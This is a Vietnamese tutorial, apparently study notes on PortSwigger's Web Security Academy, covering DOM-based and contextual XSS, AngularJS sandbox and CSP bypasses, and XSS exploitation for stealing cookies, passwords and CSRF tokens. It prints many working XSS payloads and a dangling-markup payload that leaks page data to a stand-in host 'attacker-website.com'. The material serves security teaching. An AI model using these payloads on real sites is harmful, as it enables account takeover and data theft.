Trong một lỗ hổng reflected DOM XSS, server xử lý dữ liệu từ request rồi phản chiếu nó trong response. Dữ liệu phản chiếu này có thể được đặt vào:

- một chuỗi JavaScript (string literal), hoặc
- một phần tử trong DOM, chẳng hạn như trường nhập liệu trong form.

Sau đó, một script trên trang sẽ xử lý dữ liệu phản chiếu này theo cách không an toàn, cuối cùng ghi nó vào một **sink nguy hiểm**.

Ví dụ:

```jsx
eval('var data = "reflected string"');
```

[Lab: Reflected DOM XSS | Web Security Academy](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-reflected)

Các website cũng có thể **lưu trữ dữ liệu trên server và phản chiếu nó ở nơi khác**. Trong một lỗ hổng **stored DOM XSS**, server nhận dữ liệu từ một request, lưu trữ nó, và sau đó đưa dữ liệu này vào một response về sau. Một script trong response này chứa một **sink** và xử lý dữ liệu theo cách không an toàn.

Ví dụ:

```jsx
element.innerHTML = comment.author
```

[Lab: Stored DOM XSS | Web Security Academy](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-stored)

---

## Sinks dễ bị khai thác

---

Dưới đây là một số sink chính có thể dẫn đến lỗ hổng DOM-XSS:

- `document.write()`
- `document.writeln()`
- `document.domain`
- `element.innerHTML`
- `element.outerHTML`
- `element.insertAdjacentHTML`
- `element.onevent`

Các hàm jQuery sau đây cũng là **sink** có thể dẫn đến DOM-XSS:

- `add()`
- `after()`
- `append()`
- `animate()`
- `insertAfter()`
- `insertBefore()`
- `before()`
- `html()`
- `prepend()`
- `replaceAll()`
- `replaceWith()`
- `wrap()`
- `wrapInner()`
- `wrapAll()`
- `has()`
- `constructor()`
- `init()`
- `index()`
- `jQuery.parseHTML()`
- `$.parseHTML()`

---

## Phòng tránh

---

Bên cạnh các biện pháp chung được mô tả trong phần về **DOM-based vulnerabilities**, bạn cần tránh để dữ liệu từ bất kỳ **nguồn không tin cậy** nào được ghi **động** vào tài liệu HTML.

---

# XSS Contexts

---

Khi kiểm thử các lỗ hổng **reflected XSS** và **stored XSS**, một nhiệm vụ quan trọng là xác định **ngữ cảnh XSS**:

- **Vị trí trong response** nơi dữ liệu do kẻ tấn công kiểm soát xuất hiện.
- **Bất kỳ kiểm tra hợp lệ (input validation) hoặc xử lý khác** nào mà ứng dụng thực hiện trên dữ liệu đó.

Dựa trên các chi tiết này, bạn có thể chọn một hoặc nhiều **payload XSS ứng viên** và kiểm thử xem chúng có hoạt động hiệu quả hay không.

> **Lưu ý**
> 
> 
> Chúng tôi đã xây dựng một **XSS cheat sheet toàn diện** để hỗ trợ kiểm thử ứng dụng web và bộ lọc. Bạn có thể lọc theo **sự kiện (events)** và **thẻ (tags)**, cũng như xem các vector nào yêu cầu tương tác của người dùng. Cheat sheet này cũng bao gồm các kỹ thuật **thoát sandbox của AngularJS** cùng nhiều phần khác để hỗ trợ nghiên cứu XSS.
> 

---

## Between HTML Tags

---

Khi ngữ cảnh XSS là **văn bản nằm giữa các thẻ HTML**, bạn cần chèn thêm các **thẻ HTML mới** được thiết kế để kích hoạt việc thực thi JavaScript.

Một số cách hữu ích để thực thi JavaScript bao gồm:

```html
<script>alert(document.domain)</script>
<img src=1 onerror=alert(1)>
```

[Lab: Reflected XSS into HTML context with most tags and attributes blocked | Web Security Academy](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked)

[Lab: Reflected XSS into HTML context with all tags blocked except custom ones | Web Security Academy](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-all-standard-tags-blocked)

[Lab: Reflected XSS with event handlers and href attributes blocked | Web Security Academy](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-event-handlers-and-href-attributes-blocked)

[Lab: Reflected XSS with some SVG markup allowed | Web Security Academy](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-some-svg-markup-allowed)

---

## In HTML Tags

---

Khi ngữ cảnh XSS nằm trong **giá trị của một thuộc tính HTML**, đôi khi bạn có thể kết thúc giá trị thuộc tính, đóng thẻ hiện tại và chèn một thẻ mới. Ví dụ:

```html
"><script>alert(document.domain)</script>
```

Tuy nhiên, phổ biến hơn trong tình huống này là các dấu ngoặc nhọn `< >` bị chặn hoặc được mã hóa, khiến bạn không thể thoát ra khỏi thẻ hiện tại. Miễn là bạn có thể kết thúc giá trị thuộc tính, bạn thường có thể thêm một thuộc tính mới tạo ra ngữ cảnh có thể chạy script, chẳng hạn như **event handler**. Ví dụ:

```html
" autofocus onfocus=alert(document.domain) x="
```

Payload trên tạo ra sự kiện **onfocus**, sẽ thực thi JavaScript khi phần tử nhận được focus, đồng thời thêm thuộc tính **autofocus** để cố gắng kích hoạt sự kiện onfocus tự động mà không cần người dùng tương tác. Cuối cùng, nó thêm `x="` để “vá” lại phần markup theo sau, tránh gây lỗi hiển thị.

[Lab: Reflected XSS into attribute with angle brackets HTML-encoded | Web Security Academy](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-attribute-angle-brackets-html-encoded)

Đôi khi ngữ cảnh XSS nằm trong một loại thuộc tính thẻ HTML mà bản thân nó có thể tạo ra ngữ cảnh thực thi script. Khi đó, bạn có thể thực thi JavaScript mà không cần kết thúc giá trị của thuộc tính. Ví dụ, nếu ngữ cảnh XSS nằm trong thuộc tính `href` của thẻ liên kết (`<a>`), bạn có thể dùng pseudo-protocol `javascript:` để thực thi script. Chẳng hạn:

```html
<a href="javascript:alert(document.domain)">
```

[Lab: Stored XSS into anchor href attribute with double quotes HTML-encoded | Web Security Academy](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-href-attribute-double-quotes-html-encoded)

Bạn có thể gặp phải các website mã hóa dấu ngoặc nhọn `< >` nhưng vẫn cho phép chèn thuộc tính. Đôi khi, việc chèn này vẫn khả thi ngay cả trong các thẻ vốn **không tự động kích hoạt sự kiện**, chẳng hạn như thẻ `<canonical>`.

Bạn có thể khai thác hành vi này bằng cách sử dụng **access keys** kết hợp với sự tương tác của người dùng trên Chrome. **Accesskey** cho phép bạn định nghĩa một phím tắt bàn phím tham chiếu tới một phần tử cụ thể. Thuộc tính `accesskey` cho phép bạn đặt một ký tự mà khi nhấn cùng với các phím khác (tùy hệ điều hành) sẽ khiến sự kiện được kích hoạt.

Trong lab tiếp theo, bạn có thể thử nghiệm với access keys và khai thác thẻ `<canonical>`. Ngoài ra, bạn cũng có thể khai thác **XSS trong các trường input ẩn (hidden input fields)** bằng một kỹ thuật do **PortSwigger Research** phát minh.

[Lab: Reflected XSS in canonical link tag | Web Security Academy](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-canonical-link-tag)

---

## JavaScript

---

Khi ngữ cảnh XSS nằm trong **một đoạn JavaScript có sẵn trong response**, sẽ có rất nhiều tình huống có thể xảy ra, và mỗi tình huống lại cần những kỹ thuật khác nhau để khai thác thành công.

---

### **Terminating the existing script**

---

Trong trường hợp đơn giản nhất, bạn có thể đóng thẻ `<script>` đang bao quanh đoạn JavaScript hiện tại, rồi chèn thêm các thẻ HTML mới để kích hoạt thực thi JavaScript.

Ví dụ, nếu ngữ cảnh XSS như sau:

```html
<script>
...
var input = 'controllable data here';
...
</script>
```

Bạn có thể sử dụng payload sau để thoát khỏi đoạn JavaScript hiện tại và thực thi code của riêng mình:

```html
</script><img src=1 onerror=alert(document.domain)>
```

Lý do payload này hoạt động là vì trình duyệt trước tiên sẽ **phân tích cú pháp HTML** để xác định các phần tử trên trang (bao gồm cả các khối script), và chỉ sau đó mới **phân tích cú pháp JavaScript** để hiểu và thực thi code nhúng. Payload trên khiến đoạn script ban đầu bị hỏng (với một chuỗi chưa kết thúc), nhưng điều đó **không ngăn cản** script tiếp theo được phân tích và thực thi bình thường.

[Lab: Reflected XSS into a JavaScript string with single quote and backslash escaped | Web Security Academy](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-single-quote-backslash-escaped)

---

### **Breaking out of a JavaScript string**

---

Trong những trường hợp ngữ cảnh XSS nằm bên trong một chuỗi có dấu nháy (`" "` hoặc `' '`), bạn thường có thể **thoát khỏi chuỗi** và thực thi JavaScript trực tiếp. Điều quan trọng là bạn phải **vá lại cú pháp của script sau vị trí XSS**, vì bất kỳ lỗi cú pháp nào cũng sẽ khiến toàn bộ script không thể chạy.

Một số cách hữu ích để thoát khỏi string literal:

```jsx
'-alert(document.domain)-'
```

```jsx
';alert(document.domain)//
```

[Lab: Reflected XSS into a JavaScript string with angle brackets HTML encoded | Web Security Academy](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-html-encoded)

Một số ứng dụng cố gắng ngăn việc thoát khỏi chuỗi JavaScript bằng cách **escape ký tự nháy đơn `'` bằng dấu gạch chéo ngược `\`**. Trong JavaScript, một backslash trước một ký tự báo cho trình phân tích cú pháp rằng ký tự đó sẽ được hiểu theo nghĩa đen, chứ không phải ký tự đặc biệt (ví dụ như ký tự kết thúc chuỗi).

Tuy nhiên, nhiều ứng dụng thường mắc lỗi **không escape chính dấu backslash**. Điều này có nghĩa là kẻ tấn công có thể chèn thêm backslash của riêng mình để vô hiệu hóa backslash do ứng dụng thêm vào.

Ví dụ, giả sử input:

```jsx
';alert(document.domain)//
```

bị ứng dụng chuyển thành:

```jsx
\';alert(document.domain)//
```

Khi đó, bạn có thể dùng payload thay thế:

```jsx
\';alert(document.domain)//
```

và nó sẽ được ứng dụng chuyển thành:

```jsx
\\';alert(document.domain)//
```

Ở đây, backslash đầu tiên khiến backslash thứ hai được hiểu theo nghĩa đen, không phải ký tự escape. Điều này làm cho dấu nháy `'` tiếp theo được hiểu là **kết thúc chuỗi**, từ đó cho phép cuộc tấn công XSS thành công.

[Lab: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped | Web Security Academy](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-double-quotes-encoded-single-quotes-escaped)

Một số website làm cho XSS khó khai thác hơn bằng cách **hạn chế các ký tự** bạn được phép sử dụng. Điều này có thể thực hiện ở mức website hoặc bằng cách triển khai **WAF** để chặn request không cho đến được website. Trong các tình huống này, bạn cần thử nghiệm các cách khác để gọi hàm nhằm **vượt qua các biện pháp bảo vệ** đó. Một cách là sử dụng **câu lệnh `throw`** kết hợp với **trình xử lý ngoại lệ**. Kỹ thuật này cho phép bạn truyền đối số vào một hàm **mà không cần dùng dấu ngoặc đơn**.

Đoạn code sau gán hàm `alert()` cho **trình xử lý ngoại lệ toàn cục** (`onerror`), và câu lệnh `throw` sẽ truyền giá trị `1` cho trình xử lý ngoại lệ (trong trường hợp này là `alert`). Kết quả là `alert()` được gọi với đối số `1`.

```
onerror=alert;throw 1
```

Có nhiều cách khác nhau để áp dụng kỹ thuật này nhằm gọi hàm **không cần dấu ngoặc**.

Lab tiếp theo minh họa một website lọc một số ký tự nhất định. Bạn sẽ phải sử dụng những kỹ thuật tương tự như mô tả ở trên để giải.

[Lab: Reflected XSS in a JavaScript URL with some characters blocked | Web Security Academy](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-url-some-characters-blocked)

---

### **Making use of HTML-encoding**

---

Khi ngữ cảnh XSS nằm trong một đoạn JavaScript sẵn có bên trong giá trị thuộc tính thẻ (được đặt trong dấu nháy), chẳng hạn như một event handler, bạn có thể tận dụng **HTML-encoding** để vượt qua một số bộ lọc đầu vào.

Sau khi trình duyệt phân tách các thẻ HTML và thuộc tính trong response, nó sẽ **giải mã HTML (HTML-decoding)** giá trị các thuộc tính thẻ trước khi tiếp tục xử lý. Nếu ứng dụng phía server chặn hoặc “làm sạch” (sanitize) một số ký tự cần thiết cho khai thác XSS, bạn thường có thể **bỏ qua kiểm tra đầu vào** bằng cách **HTML-encode** các ký tự đó.

Ví dụ, nếu ngữ cảnh XSS như sau:

```html
<a href="#" onclick="... var input='controllable data here'; ...">
```

và ứng dụng chặn hoặc escape ký tự nháy đơn, bạn có thể dùng payload dưới đây để thoát khỏi chuỗi JavaScript và thực thi script của riêng bạn:

```
&apos;-alert(document.domain)-&apos;
```

Chuỗi `&apos;` là **HTML entity** biểu diễn dấu nháy đơn (apostrophe/single quote). Bởi vì trình duyệt **giải mã HTML** giá trị của thuộc tính `onclick` trước khi JavaScript được thông dịch, các entity sẽ được giải mã thành ký tự nháy, trở thành **kí tự kết thúc chuỗi**, nhờ đó cuộc tấn công thành công.

[Lab: Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped | Web Security Academy](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-onclick-event-angle-brackets-double-quotes-html-encoded-single-quotes-backslash-escaped)

---

### **XSS in JavaScript template literals**

---

JavaScript **template literal** là chuỗi ký tự cho phép nhúng trực tiếp các biểu thức JavaScript. Các biểu thức nhúng này sẽ được đánh giá và thường được nối vào chuỗi bao quanh. Template literal được bao bởi **dấu backtick ` `** thay vì dấu nháy thông thường, và biểu thức nhúng được xác định bằng cú pháp `${...}`.

Ví dụ, đoạn script sau sẽ in ra thông điệp chào mừng kèm theo tên hiển thị của người dùng:

```jsx
document.getElementById('message').innerText = `Welcome, ${user.displayName}.`;
```

Khi ngữ cảnh XSS nằm trong một template literal của JavaScript, bạn **không cần phải kết thúc literal**. Thay vào đó, bạn chỉ cần sử dụng cú pháp `${...}` để nhúng một biểu thức JavaScript, và nó sẽ được thực thi khi template literal được xử lý.

Ví dụ, nếu ngữ cảnh XSS như sau:

```html
<script>
...
var input = `controllable data here`;
...
</script>
```

Bạn có thể dùng payload này để thực thi JavaScript mà không cần đóng template literal:

```jsx
${alert(document.domain)}
```

[Lab: Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped | Web Security Academy](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-template-literal-angle-brackets-single-double-quotes-backslash-backticks-escaped)

---

## AngularJS

---

### **Client-side template injection**

---

Lỗ hổng **client-side template injection (CSTI)** xuất hiện khi các ứng dụng sử dụng **framework template phía client** nhúng động dữ liệu đầu vào của người dùng vào trang web.

Khi render trang, framework sẽ quét nội dung để tìm các **biểu thức template** và thực thi bất kỳ biểu thức nào mà nó phát hiện. Kẻ tấn công có thể lợi dụng điều này bằng cách cung cấp một **biểu thức template độc hại**, từ đó khởi chạy một cuộc tấn công **cross-site scripting (XSS)**.

---

### AngularJS Sandbox

---

**AngularJS sandbox** là một cơ chế được thiết kế để ngăn truy cập vào các đối tượng tiềm ẩn nguy hiểm (như `window` hoặc `document`) trong các biểu thức template của AngularJS. Nó cũng ngăn việc truy cập vào các thuộc tính nguy hiểm như `__proto__`.

Mặc dù nhóm phát triển AngularJS **không coi sandbox là một ranh giới bảo mật (security boundary)**, nhưng phần lớn cộng đồng lập trình viên lại cho rằng nó có vai trò như vậy. Ban đầu, việc vượt qua sandbox khá khó khăn, nhưng các nhà nghiên cứu bảo mật đã tìm ra nhiều cách để bypass.

Kết quả là sandbox này đã bị **loại bỏ hoàn toàn trong AngularJS phiên bản 1.6**. Tuy nhiên, nhiều ứng dụng cũ vẫn sử dụng các phiên bản AngularJS trước đó, và vì vậy có thể vẫn dễ bị tấn công.

---

### AngularJS Sandbox - Hoạt động

---

Sandbox trong AngularJS hoạt động bằng cách **phân tích (parse) biểu thức**, sau đó **ghi lại (rewrite) đoạn JavaScript**, rồi sử dụng nhiều hàm khác nhau để kiểm tra xem đoạn code đã ghi lại có chứa các đối tượng nguy hiểm hay không.

- Hàm **`ensureSafeObject()`** kiểm tra xem một đối tượng có tham chiếu đến chính nó hay không. Đây là một cách để phát hiện đối tượng `window`. Tương tự, **Function constructor** cũng được phát hiện bằng cách kiểm tra xem thuộc tính `constructor` có tham chiếu đến chính nó hay không.
- Hàm **`ensureSafeMemberName()`** kiểm tra từng thuộc tính được truy cập của đối tượng. Nếu phát hiện các thuộc tính nguy hiểm như `__proto__` hoặc `__lookupGetter__`, đối tượng sẽ bị chặn.
- Hàm **`ensureSafeFunction()`** ngăn việc gọi các phương thức nguy hiểm như `call()`, `apply()`, `bind()`, hoặc `constructor()`.

Bạn có thể trực tiếp quan sát sandbox hoạt động bằng cách mở đoạn mã AngularJS trong **JSFiddle**, rồi đặt breakpoint tại dòng **13275** của file `angular.js`. Ở đó, biến **`fnString`** chứa code đã được ghi lại, cho phép bạn thấy cách AngularJS biến đổi biểu thức gốc.

---

### AngularJS Sandbox escape - Hoạt động

---

Một **sandbox escape** trong AngularJS liên quan đến việc đánh lừa sandbox để nó nghĩ rằng biểu thức độc hại là vô hại.

Kỹ thuật thoát sandbox nổi tiếng nhất sử dụng việc ghi đè hàm **`charAt()`** toàn cục trong một biểu thức:

```jsx
'a'.constructor.prototype.charAt = [].join
```

Khi kỹ thuật này được phát hiện, AngularJS chưa ngăn chặn việc ghi đè này. Cuộc tấn công hoạt động bằng cách thay thế hàm `charAt()` bằng phương thức **`[].join`**, khiến `charAt()` trả về toàn bộ chuỗi ký tự được truyền vào thay vì một ký tự duy nhất.

Điều này lợi dụng logic của hàm **`isIdent()`** trong AngularJS. Hàm này dự kiến sẽ so sánh một ký tự đơn lẻ, nhưng thay vào đó nó so sánh một chuỗi nhiều ký tự. Vì một ký tự đơn luôn được coi là “nhỏ hơn” chuỗi nhiều ký tự, nên hàm **`isIdent()`** luôn trả về `true`.

Ví dụ:

```jsx
isIdent = function(ch) {
    return ('a' <= ch && ch <= 'z' || 'A' <= ch && ch <= 'Z' || '_' === ch || ch === '$');
}
isIdent('x9=9a9l9e9r9t9(919)')
```

Khi hàm **`isIdent()`** bị đánh lừa, bạn có thể chèn JavaScript độc hại. Ví dụ, biểu thức sau sẽ được chấp nhận:

```jsx
$eval('x=alert(1)')
```

Lưu ý rằng chúng ta cần sử dụng hàm **`$eval()`** của AngularJS, vì việc ghi đè hàm `charAt()` chỉ có hiệu lực khi đoạn code trong sandbox được thực thi.

Kỹ thuật này cho phép **bypass sandbox** và thực thi JavaScript tùy ý. Trên thực tế, **PortSwigger Research** đã nhiều lần phá vỡ hoàn toàn sandbox của AngularJS.

Xây dựng kỹ thuật:

Bạn đã hiểu cách một kỹ thuật thoát sandbox cơ bản hoạt động, nhưng bạn có thể gặp những website hạn chế nghiêm ngặt hơn về tập ký tự được phép. Ví dụ, một site có thể chặn bạn sử dụng dấu nháy đơn hoặc nháy kép. Trong tình huống này, bạn cần dùng các hàm như `String.fromCharCode()` để tạo ra ký tự. Mặc dù AngularJS chặn truy cập đến **String constructor** trong biểu thức, bạn có thể vượt qua bằng cách sử dụng thuộc tính `constructor` của **một chuỗi**. Điều này hiển nhiên đòi hỏi phải có một chuỗi, vì vậy để xây dựng tấn công theo cách này, bạn sẽ cần tìm cách tạo chuỗi **mà không dùng** dấu nháy đơn hoặc nháy kép.

Trong một kỹ thuật thoát sandbox tiêu chuẩn, bạn sẽ dùng `$eval()` để thực thi payload JavaScript, nhưng trong lab dưới đây, hàm `$eval()` là **undefined**. May mắn thay, ta có thể dùng **bộ lọc `orderBy`** thay thế. Cú pháp điển hình của bộ lọc `orderBy` như sau:

```
[123]|orderBy:'Some string'
```

Lưu ý toán tử `|` có ý nghĩa khác với trong JavaScript. Thông thường, đây là phép OR theo bit, nhưng trong AngularJS nó biểu diễn **phép lọc (filter)**. Ở đoạn mã trên, ta gửi mảng `[123]` ở bên trái vào bộ lọc `orderBy` ở bên phải. Dấu hai chấm biểu thị một đối số truyền vào bộ lọc, trong trường hợp này là một chuỗi. Bộ lọc `orderBy` thường được dùng để sắp xếp một đối tượng, nhưng nó cũng chấp nhận **một biểu thức**, có nghĩa là ta có thể dùng nó để truyền một payload.

[Lab: Reflected XSS with AngularJS sandbox escape without strings | Web Security Academy](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection/lab-angular-sandbox-escape-without-strings)

---

### AngularJS CSP - Bypass

---

CSP bypass trong AngularJS hoạt động tương tự như các kỹ thuật thoát sandbox thông thường, nhưng thường liên quan đến **HTML injection**. Khi chế độ **CSP mode** được bật trong AngularJS, nó sẽ **phân tích các biểu thức template theo cách khác** và tránh sử dụng **Function constructor**. Điều này có nghĩa là các kỹ thuật sandbox escape tiêu chuẩn sẽ không còn hiệu quả.

Tùy theo chính sách cụ thể, **CSP sẽ chặn các sự kiện JavaScript**. Tuy nhiên, AngularJS định nghĩa **các sự kiện riêng** mà ta có thể lợi dụng. Khi ở trong một sự kiện, AngularJS định nghĩa một đối tượng đặc biệt **`$event`**, đối tượng này tham chiếu trực tiếp đến **browser event object**.

Bạn có thể sử dụng đối tượng này để thực hiện bypass CSP. Trên **Chrome**, `$event` có một thuộc tính đặc biệt gọi là **`path`**. Thuộc tính này chứa **một mảng các đối tượng** gây ra việc thực thi sự kiện. Phần tử cuối cùng trong mảng luôn là **`window` object**, và chúng ta có thể lợi dụng nó để thực thi hàm toàn cục như `alert()`.

Bằng cách truyền mảng này vào **bộ lọc `orderBy`**, ta có thể liệt kê các phần tử của mảng và sử dụng phần tử cuối cùng (window object) để gọi hàm. Ví dụ:

```html
<input autofocus ng-focus="$event.path|orderBy:'[].constructor.from([1],alert)'">
```

Ở đây, ta dùng hàm **`from()`**, cho phép chuyển một đối tượng thành mảng và gọi một hàm (được chỉ định ở tham số thứ hai) trên từng phần tử của mảng. Trong trường hợp này, hàm được gọi là **`alert()`**.

Chúng ta không thể gọi trực tiếp hàm này, vì AngularJS sandbox sẽ phân tích và phát hiện rằng **window object** đang được sử dụng để gọi hàm. Việc dùng **`from()`** sẽ che giấu window object khỏi sandbox, nhờ đó cho phép ta chèn mã độc.

PortSwigger Research đã từng tạo một **CSP bypass chỉ trong 56 ký tự** bằng cách sử dụng kỹ thuật này.

Trong lab tiếp theo, sẽ có **giới hạn về độ dài payload**, vì vậy vector bypass sử dụng `$event.path|orderBy` sẽ không còn hiệu quả. Để khai thác lab này, bạn cần suy nghĩ đến nhiều cách khác nhau để **che giấu `window object`** khỏi sandbox của AngularJS.

Một cách là lợi dụng hàm **`array.map()`**, ví dụ:

```jsx
[1].map(alert)
```

Hàm `map()` nhận một hàm làm đối số và sẽ gọi nó cho từng phần tử trong mảng. Điều này **bypass sandbox** vì tham chiếu đến hàm `alert()` được sử dụng **mà không cần gọi trực tiếp thông qua `window`**.

Để giải lab, bạn cần thử nghiệm nhiều cách khác nhau để gọi `alert()` (hoặc các hàm khác) **mà không kích hoạt cơ chế phát hiện window** của AngularJS.

[Lab: Reflected XSS with AngularJS sandbox escape and CSP | Web Security Academy](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection/lab-angular-sandbox-escape-and-csp)

Để ngăn chặn lỗ hổng client-side template injection, hãy tránh sử dụng dữ liệu đầu vào không tin cậy của người dùng để tạo template hoặc biểu thức. Nếu điều này không khả thi, hãy cân nhắc **lọc bỏ cú pháp biểu thức template** khỏi đầu vào người dùng trước khi nhúng nó vào các template phía client.

Lưu ý rằng **HTML-encoding là không đủ** để ngăn chặn tấn công client-side template injection, vì các framework sẽ **giải mã HTML (HTML-decode)** phần nội dung liên quan trước khi dò tìm và thực thi các biểu thức template.

---

# **Exploiting XSS vulnerabilities**

---

Cách truyền thống để chứng minh bạn đã tìm thấy một lỗ hổng XSS là tạo một **popup** bằng hàm `alert()`. Điều này không phải vì XSS có liên quan đến popup, mà chỉ đơn giản là một cách chứng minh bạn có thể thực thi **JavaScript tùy ý** trên một domain nhất định.

Bạn có thể thấy một số người sử dụng `alert(document.domain)`. Đây là cách để chỉ rõ domain mà JavaScript đang được thực thi.

Đôi khi bạn sẽ muốn tiến xa hơn và chứng minh rằng một lỗ hổng XSS thực sự là một mối đe dọa bằng cách cung cấp một **exploit hoàn chỉnh**. Trong phần này, chúng ta sẽ tìm hiểu **ba phương pháp phổ biến và mạnh mẽ nhất** để khai thác một lỗ hổng XSS.

---

## **Steal cookies**

---

Đánh cắp cookie là một cách khai thác XSS truyền thống. Hầu hết các ứng dụng web sử dụng cookie để quản lý phiên (session). Bạn có thể lợi dụng lỗ hổng XSS để gửi cookie của nạn nhân về domain của mình, sau đó chèn cookie đó thủ công vào trình duyệt để **mạo danh nạn nhân**.

Tuy nhiên, trong thực tế, cách này có một số hạn chế đáng kể:

- Nạn nhân có thể **chưa đăng nhập**.
- Nhiều ứng dụng thiết lập cookie với cờ **HttpOnly**, khiến JavaScript không thể truy cập.
- Phiên làm việc có thể được ràng buộc thêm với các yếu tố khác, chẳng hạn như **địa chỉ IP của người dùng**.
- Phiên có thể **hết hạn (timeout)** trước khi bạn kịp chiếm đoạt.

[Lab: Exploiting cross-site scripting to steal cookies | Web Security Academy](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies)

---

## Capture passwords

---

Ngày nay, nhiều người dùng sử dụng **trình quản lý mật khẩu** có tính năng **tự động điền (auto-fill)**. Bạn có thể lợi dụng điều này bằng cách tạo một trường nhập mật khẩu, đọc giá trị mật khẩu được tự động điền, rồi gửi nó về domain của bạn. Kỹ thuật này tránh được phần lớn vấn đề khi đánh cắp cookie và thậm chí còn có thể chiếm quyền truy cập vào mọi tài khoản khác nơi nạn nhân **tái sử dụng cùng một mật khẩu**.

Nhược điểm chính của kỹ thuật này là nó chỉ hoạt động với những người dùng có **trình quản lý mật khẩu tự động điền**. (Dĩ nhiên, nếu người dùng không lưu mật khẩu, bạn vẫn có thể thử **phishing ngay trên site** để lấy mật khẩu của họ, nhưng đó không hoàn toàn là cùng một kỹ thuật.)

[Lab: Exploiting cross-site scripting to capture passwords | Web Security Academy](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-capturing-passwords)

---

## Bypass CSRF

---

XSS cho phép kẻ tấn công làm hầu như mọi thứ mà một người dùng hợp lệ có thể làm trên website. Khi có thể thực thi JavaScript tùy ý trong trình duyệt của nạn nhân, XSS cho phép bạn thực hiện nhiều hành động thay cho người dùng, ví dụ: gửi tin nhắn, chấp nhận lời mời kết bạn, chèn backdoor vào kho mã nguồn, hoặc chuyển Bitcoin.

Một số website cho phép người dùng đã đăng nhập thay đổi địa chỉ email **mà không cần nhập lại mật khẩu**. Nếu bạn tìm thấy lỗ hổng XSS trên những site này, bạn có thể khai thác nó để **đánh cắp CSRF token**. Với token đó, bạn có thể đổi email của nạn nhân sang email do bạn kiểm soát, sau đó kích hoạt **đặt lại mật khẩu** để chiếm quyền truy cập tài khoản.

Kiểu khai thác này **kết hợp XSS (để lấy CSRF token)** với **chức năng thường bị CSRF nhắm đến**. Trong khi CSRF truyền thống là một lỗ hổng “một chiều” (kẻ tấn công chỉ có thể khiến nạn nhân gửi request mà không thể xem response), thì XSS cho phép **giao tiếp hai chiều**: kẻ tấn công vừa có thể gửi request tùy ý, vừa có thể đọc phản hồi. Điều này tạo ra một **cuộc tấn công lai**, cho phép bypass cơ chế chống CSRF.

> **Lưu ý**
> 
> 
> CSRF token **không hiệu quả chống lại XSS**, vì XSS cho phép kẻ tấn công đọc trực tiếp giá trị token từ response.
> 

[Lab: Exploiting XSS to bypass CSRF defenses | Web Security Academy](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf)

---

# **Dangling markup injection**

---

## Khái niệm

---

Dangling markup injection là một kỹ thuật để **thu thập dữ liệu cross-domain** trong những tình huống mà một cuộc tấn công XSS đầy đủ không khả thi.

Giả sử một ứng dụng nhúng dữ liệu do kẻ tấn công kiểm soát vào response theo cách không an toàn:

```html
<input type="text" name="input" value="CONTROLLABLE DATA HERE
```

Giả sử thêm rằng ứng dụng **không lọc hoặc escape ký tự `>` hoặc `"`**. Khi đó, kẻ tấn công có thể dùng cú pháp sau để thoát khỏi giá trị thuộc tính và thẻ bao quanh, quay lại ngữ cảnh HTML:

```
">
```

Trong tình huống này, kẻ tấn công sẽ thường thử thực hiện XSS. Nhưng giả sử XSS thông thường **không khả thi** do các bộ lọc đầu vào, CSP, hoặc các biện pháp khác. Khi đó, vẫn có thể thực hiện một tấn công **dangling markup injection** với payload như sau:

```html
"><img src='//attacker-website.com?
```

Payload này tạo ra một thẻ `<img>` và định nghĩa thuộc tính `src` trỏ đến một URL trên server của kẻ tấn công. Lưu ý rằng payload **không đóng thuộc tính `src`**, khiến nó bị “dangling”. Khi trình duyệt phân tích response, nó sẽ tiếp tục đọc cho đến khi gặp dấu nháy `'` để kết thúc thuộc tính. Mọi thứ trước dấu đó sẽ được coi là một phần của URL và được gửi đến server của kẻ tấn công dưới dạng query string. Tất cả ký tự không phải chữ-số (bao gồm cả xuống dòng) sẽ được URL-encode.

**Hệ quả**: Kẻ tấn công có thể thu thập được một phần dữ liệu của ứng dụng xuất hiện sau điểm injection, và dữ liệu này có thể chứa thông tin nhạy cảm, chẳng hạn như **CSRF token, email, hoặc dữ liệu tài chính**.

Bất kỳ thuộc tính HTML nào có khả năng tạo request ra bên ngoài đều có thể được lợi dụng cho **dangling markup injection**.

Lab tiếp theo khó hơn vì tất cả request ra ngoài đều bị chặn. Tuy nhiên, vẫn có một số thẻ cho phép lưu trữ dữ liệu và trích xuất từ server bên ngoài sau này. Việc giải lab có thể yêu cầu **sự tương tác từ người dùng**.

[Lab: Reflected XSS protected by very strict CSP, with dangling markup attack | Web Security Academy](https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-very-strict-csp-with-dangling-markup-attack)

---

## Phòng tránh

---

Bạn có thể ngăn chặn các cuộc tấn công **dangling markup** bằng các biện pháp phòng thủ tương tự như khi ngăn chặn **cross-site scripting (XSS)**, cụ thể là:

- **Mã hóa dữ liệu khi xuất ra (output encoding)**.
- **Kiểm tra và xác thực dữ liệu đầu vào (input validation)** ngay khi nhận được.

